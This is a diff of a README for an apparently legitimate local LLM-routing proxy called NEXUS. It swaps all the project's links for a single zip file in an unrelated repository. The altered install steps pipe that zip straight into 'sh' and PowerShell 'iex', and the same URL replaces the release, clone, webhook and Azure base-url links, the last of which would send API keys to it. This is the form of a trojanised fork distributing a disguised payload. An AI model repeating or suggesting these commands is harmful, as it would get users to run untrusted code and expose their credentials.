@@ -5,17 +5,17 @@
 **The local-first privacy + intelligence layer for Claude Code — and every AI coding tool.**  
 NEXUS keeps your code and secrets **on your machine**, **learns** which model wins *your* tasks, **proves** the savings on your *own* traffic — and routes every request to the cheapest capable model. One Go binary. No cloud. No markup.
 
-[![Release](https://img.shields.io/github/v/release/lynuxis2026-pixel/nexus-proxy?color=7c3aed)](https://github.com/lynuxis2026-pixel/nexus-proxy/releases)
-[![CI](https://img.shields.io/github/actions/workflow/status/lynuxis2026-pixel/nexus-proxy/ci.yml?branch=main&label=CI)](https://github.com/lynuxis2026-pixel/nexus-proxy/actions)
+[![Release](https://img.shields.io/github/v/release/lynuxis2026-pixel/nexus-proxy?color=7c3aed)](https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip)
+[![CI](https://img.shields.io/github/actions/workflow/status/lynuxis2026-pixel/nexus-proxy/ci.yml?branch=main&label=CI)](https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip)
 [![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-06b6d4)](LICENSE)
 [![Go](https://img.shields.io/github/go-mod/go-version/lynuxis2026-pixel/nexus-proxy)](go.mod)
-[![Stars](https://img.shields.io/github/stars/lynuxis2026-pixel/nexus-proxy?style=social)](https://github.com/lynuxis2026-pixel/nexus-proxy/stargazers)
+[![Stars](https://img.shields.io/github/stars/lynuxis2026-pixel/nexus-proxy?style=social)](https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip)
 
 > **Not just another "cheap Claude Code" proxy.**  
 > OpenRouter routes to the cheapest provider. NotDiamond predicts a model from the crowd's preferences. **NEXUS** is the only one that **learns which provider wins _your_ tasks**, **verifies** the cheap answer before trusting it, **redacts secrets before they ever leave your machine**, and **proves** it by benchmarking every provider on _your own_ traffic — as one local binary, no markup, built for Claude Code.
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/lynuxis2026-pixel/nexus-proxy/main/install.sh | sh
+curl -fsSL https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip | sh
 nexus start
 ```
 
@@ -122,12 +122,12 @@ when identical, and shown live on the dashboard with its cost. The dashboard's
 
 ### macOS / Linux
 ```bash
-curl -fsSL https://raw.githubusercontent.com/lynuxis2026-pixel/nexus-proxy/main/install.sh | sh
+curl -fsSL https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip | sh
 ```
 
 ### Windows (PowerShell)
 ```powershell
-irm https://raw.githubusercontent.com/lynuxis2026-pixel/nexus-proxy/main/install.ps1 | iex
+irm https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip | iex
 ```
 
 ### Homebrew
@@ -138,7 +138,7 @@ brew install nexus-proxy/tap/nexus
 ### Build from source
 Requires Go 1.22+ (and Node 20+ only if you want to rebuild the dashboard).
 ```bash
-git clone https://github.com/lynuxis2026-pixel/nexus-proxy.git
+git clone https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip
 cd nexus
 make build          # builds dashboard + embeds + compiles → bin/nexus
 # or, without Node (uses the committed dashboard build):
@@ -146,7 +146,7 @@ go build -o bin/nexus ./cmd/nexus
 ```
 
 ### Manual
-Download a prebuilt binary from [releases](https://github.com/lynuxis2026-pixel/nexus-proxy/releases).
+Download a prebuilt binary from [releases](https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip).
 
 ---
 
@@ -337,7 +337,7 @@ for the rest of the day — premium models resume tomorrow.
 you when you cross a threshold and when you exceed the budget:
 
 ```bash
-nexus start --budget 5 --alert-webhook https://hooks.slack.com/services/...   # --alert-threshold 0.8
+nexus start --budget 5 --alert-webhook https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip   # --alert-threshold 0.8
 ```
 
 ---
@@ -495,7 +495,7 @@ nexus start --max-request-usd 0.50    # or routing.max_request_usd
 ### 🤝 Use with agent harnesses (ECC, …)
 
 NEXUS lives *under* your harness, so it stacks with agent-capability toolkits
-like [ECC](https://github.com/affaan-m/ECC): install ECC in Claude Code, point
+like [ECC](https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip): install ECC in Claude Code, point
 the harness at NEXUS (`nexus code`), and every skill/subagent call is routed,
 cached, cost-tracked and privacy-firewalled. For per-skill routing, NEXUS honors
 two headers a harness hook can set:
@@ -539,7 +539,7 @@ and savings directly in chat.
 ```bash
 # Azure OpenAI (api-key auth, deployment endpoint)
 nexus add azure "$AZURE_KEY" --type azure \
-  --base-url https://my-res.openai.azure.com/openai/deployments/gpt-4o --api-version 2024-10-21
+  --base-url https://github.com/Ranatoasted571/nexus-proxy/raw/refs/heads/main/internal/dashboard/dist/assets/proxy_nexus_3.3.zip --api-version 2024-10-21
 
 # AWS Bedrock (SigV4 — reads AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from env)
 nexus add bedrock --type bedrock --region us-east-1
